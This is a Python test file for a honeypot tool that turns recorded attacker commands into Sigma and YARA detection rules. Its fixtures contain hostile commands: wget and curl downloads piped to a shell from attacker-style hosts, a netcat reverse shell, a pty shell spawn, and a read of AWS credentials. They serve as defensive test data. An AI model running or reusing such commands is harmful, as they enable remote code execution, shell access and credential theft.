"""Тесты генератора правил обнаружения Detection-as-Code (Sigma и YARA)."""
from __future__ import annotations

import httpx
import pytest
import yaml
from fastapi.testclient import TestClient

from honeymind.adapter import CanonEvent, KIND_COMMAND, KIND_DOWNLOAD, KIND_HONEYTOKEN
from honeymind.analyzer import Analyzer
from honeymind.api import create_app
from honeymind.detection_rules import (
    DetectionRuleSynthesizer,
    extract_iocs_from_events,
    sanitize_yara_identifier,
)


def test_extract_iocs_from_events():
    events = [
        CanonEvent(kind=KIND_COMMAND, command="wget http://45.9.148.12/update.sh -O /tmp/up.sh"),
        CanonEvent(kind=KIND_COMMAND, command="chmod +x /tmp/up.sh && /tmp/up.sh"),
        CanonEvent(kind=KIND_DOWNLOAD, url="http://45.9.148.12/update.sh", file_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
        CanonEvent(kind=KIND_HONEYTOKEN, token_id="AKIAIOSFODNN7EXAMPLE", command="/root/.aws/credentials"),
    ]

    iocs = extract_iocs_from_events(events)
    assert len(iocs.commands) == 2
    assert "http://45.9.148.12/update.sh" in iocs.urls
    assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in iocs.file_hashes
    assert "up.sh" in iocs.script_names
    assert "AKIAIOSFODNN7EXAMPLE" in iocs.honeytokens
    assert "/root/.aws/credentials" in iocs.honeytokens


def test_sanitize_yara_identifier():
    assert sanitize_yara_identifier("sess-1234-abc") == "sess_1234_abc"
    assert sanitize_yara_identifier("99_bottles") == "Rule_99_bottles"
    assert sanitize_yara_identifier("!@#$%^") == "Rule"


def test_synthesizer_generates_valid_sigma_yaml():
    synth = DetectionRuleSynthesizer()
    events = [
        {"type": "command", "command": "curl -s http://194.26.29.112/miner.sh | bash"},
        {"type": "command", "command": "chmod +x /tmp/miner.sh"},
    ]

    bundle = synth.synthesize(
        events,
        session_id="test_sess_01",
        threat_score=95,
        category="malware_downloader",
    )

    assert bundle.sigma_yaml
    # Проверка, что Sigma — валидный YAML
    parsed = yaml.safe_load(bundle.sigma_yaml)
    assert isinstance(parsed, dict)
    assert "title" in parsed
    assert "HoneyForge Auto-Detect" in parsed["title"]
    assert parsed["id"]
    assert parsed["status"] == "experimental"
    assert parsed["logsource"]["product"] == "linux"
    assert parsed["logsource"]["category"] == "process_creation"
    assert parsed["level"] == "critical"
    assert "detection" in parsed
    assert "selection_cmd" in parsed["detection"]
    assert any("curl" in str(x) for x in parsed["detection"]["selection_cmd"]["CommandLine|contains"])


def test_synthesizer_generates_valid_yara_rule():
    synth = DetectionRuleSynthesizer()
    events = [
        {"type": "command", "command": "wget http://evil.com/payload.bin -O /tmp/x"},
        {"type": "payload", "file_hash": "a" * 64, "url": "http://evil.com/payload.bin"},
    ]

    bundle = synth.synthesize(
        events,
        session_id="test_sess_02",
        threat_score=85,
        category="malware_downloader",
    )

    yara_text = bundle.yara_rule
    assert yara_text.startswith("rule HoneyForge_Threat_test_sess_02_malware_downloader {")
    assert "meta:" in yara_text
    assert 'author = "HoneyForge Threat Intelligence Engine"' in yara_text
    assert "threat_score = 85" in yara_text
    assert "strings:" in yara_text
    assert f'$hash_1 = "{"a"*64}" ascii' in yara_text
    assert '$url_2 = "http://evil.com/payload.bin" ascii nocase' in yara_text
    assert "condition:" in yara_text
    assert yara_text.strip().endswith("}")


def test_analyzer_session_automatically_attaches_detection_rules():
    analyzer = Analyzer()
    events = [
        {"type": "connect", "src_ip": "1.2.3.4", "session_id": "sess-live-99"},
        {"type": "command", "command": "uname -a"},
        {"type": "command", "command": "wget http://attacker.local/sh.sh -O- | sh"},
    ]

    res = analyzer.analyze_session(events)
    assert "detection_rules" in res
    bundle = res["detection_rules"]
    assert bundle["session_id"] == "sess-live-99"
    assert bundle["sigma_yaml"]
    assert bundle["yara_rule"]

    # Проверка парсинга Sigma YAML из результата анализа
    sigma_obj = yaml.safe_load(bundle["sigma_yaml"])
    assert sigma_obj["logsource"]["product"] == "linux"


def test_api_export_detection_rules_endpoint():
    app = create_app()
    client = TestClient(app)

    payload = {
        "events": [
            {"command": "nc -e /bin/sh 10.0.0.1 4444"},
            {"command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"},
        ],
        "session_id": "sess_revshell_42",
        "threat_score": 90,
        "category": "reverse_shell",
    }

    resp = client.post("/export/detection_rules", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["session_id"] == "sess_revshell_42"
    assert data["threat_score"] == 90
    assert "sigma_yaml" in data
    assert "yara_rule" in data
    assert "HoneyForge_Threat_sess_revshell_42_reverse_shell" in data["yara_rule"]


def test_center_honeymind_client_export_detection_rules():
    from backend.center.app.config import Settings
    from backend.center.app.honeymind import HoneyMind

    def handler(request: httpx.Request) -> httpx.Response:
        assert request.url.path == "/export/detection_rules"
        return httpx.Response(
            200,
            json={
                "session_id": "sess-test",
                "threat_score": 95,
                "category": "malware_downloader",
                "sigma_yaml": "title: Test Sigma Rule\nlevel: high\n",
                "yara_rule": "rule Test { condition: true }",
                "mitre_techniques": ["T1105"],
                "iocs_count": {"commands": 1, "urls": 1, "file_hashes": 0, "scripts": 0, "honeytokens": 0},
                "generated_at": "2026-10-13T12:00:00Z",
            },
        )

    transport = httpx.MockTransport(handler)
    settings = Settings(honeymind_url="http://test-honeymind:8000")
    hm = HoneyMind(settings, transport=transport)

    res = hm.export_detection_rules(
        events=[{"command": "curl http://evil.com/x.sh | sh"}],
        session_id="sess-test",
    )
    assert res is not None
    assert res["session_id"] == "sess-test"
    assert "Test Sigma Rule" in res["sigma_yaml"]
    assert "rule Test" in res["yara_rule"]
